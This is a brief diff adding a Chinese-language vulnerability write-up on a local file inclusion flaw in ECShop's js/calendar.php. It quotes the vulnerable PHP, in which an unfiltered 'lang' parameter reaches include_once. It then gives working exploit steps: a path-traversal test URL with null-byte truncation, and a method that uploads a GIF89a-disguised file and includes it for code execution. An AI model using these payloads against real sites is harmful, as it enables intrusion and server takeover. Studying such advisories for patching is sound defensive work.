@@ -1,0 +1,3 @@
+ECshop本地包含漏洞
+
+js/calendar.php $lang = (!empty($_GET['lang'])) ? trim($_GET['lang']) : ‘zh_cn’;//没有过滤，很明显的包含漏洞 if (!file_exists(‘../languages/’ . $lang . ‘/calendar.php’)) { $lang = ‘zh_cn’; } require(dirname(dirname(__FILE__)) . ‘/data/config.php’); header(‘Content-type: application/x-javascript; charset=’ . EC_CHARSET); include_once(‘../languages/’ . $lang . ‘/calendar.php’);//这里包含，需要截断 测试代码 : // 需要 magic_quotes_gpc = Off /js/calendar.php?lang=../index.php%00.（注意后面有个.） 利用方法: 先注册用户 然后上传GIF89a头的GIF文件欺骗， 然后包含 代码:http://localhost/js/calendar.php?lang=../data/feedbackimg/6_20101228vyrpbg.gif%00
